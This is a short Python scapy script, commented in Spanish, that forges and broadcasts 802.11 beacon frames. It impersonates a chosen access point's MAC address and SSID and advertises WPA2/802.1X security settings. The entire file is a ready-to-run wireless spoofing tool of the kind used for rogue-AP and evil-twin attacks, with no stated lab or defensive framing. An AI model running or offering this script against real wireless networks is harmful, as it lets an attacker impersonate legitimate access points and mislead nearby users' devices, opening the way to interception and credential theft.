from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
import sys

iface_send = sys.argv[1] # Interfaz
mac_origen = sys.argv[2] # MAC a suplantar
ssid = sys.argv[3]
mac_destino = "ff:ff:ff:ff:ff:ff"  # MAC de broadcast
bssid = mac_origen
canal = 1
erp_info = b'\x02'

capabilities_information = "0x3104" #Capabilities Information

# Información RSN ajustada para precisión y compatibilidad
#rsn_info = Dot11Elt(ID="RSNinfo", info=(
#    "\x01\x00"  # RSN Version 1
#    "\x00\x0f\xac\x04"  # Group Cipher Suite: AES CCM
#    "\x01\x00"  # 1 Pairwise Cipher Suite count
#    "\x00\x0f\xac\x04"  # Pairwise Cipher Suite List: AES CCMP
#    "\x03\x00"  #Auth Key Management (AKM) Suit Count
#    "\x0f\xac\x02\x00\x0f\xac\x06\x00\x0f\xac\x08" #Auth key management
#    "\x01\x00"  # 1 Authentication Key Management Suite (AKM)
#    "\x0c\x00"  # RSN capabilities
#))

rsn_info = Dot11Elt(ID="RSNinfo", info=(
    b"\x01\x00"  # RSN Version 1
    b"\x00\x0f\xac\x04"  # Group Cipher Suite: AES CCMP (en algunos textos como CCM)
    b"\x01\x00"  # 1 Pairwise Cipher Suite count
    b"\x00\x0f\xac\x04"  # Pairwise Cipher Suite List: AES CCMP
    b"\x01\x00"  # 1 Authentication Key Management Suite (AKM) count
    b"\x00\x0f\xac\x02"  # Auth Key Management Suite List: 802.1X (sin pre-autenticación)
    b"\x0c\x00"  # RSN capabilities (WPA2 capabilities)
))

# Construir la trama beacon
trama_beacon = RadioTap() / \
               Dot11(type=0, subtype=8, addr1=mac_destino, addr2=mac_origen, addr3=bssid) / \
               Dot11Beacon(cap=int(capabilities_information,16)) / \
               Dot11Elt(ID="SSID", info=ssid) / \
               Dot11Elt(ID="Supported Rates", info=bytes([0x0c, 0x12, 0x18, 0x24])) / \
               Dot11Elt(ID="DSSS Set", info=chr(canal)) / \
               Dot11Elt(ID="ERPinfo", info=erp_info) / \
               rsn_info

sendp(trama_beacon, iface=iface_send, count=250, inter=0.1)
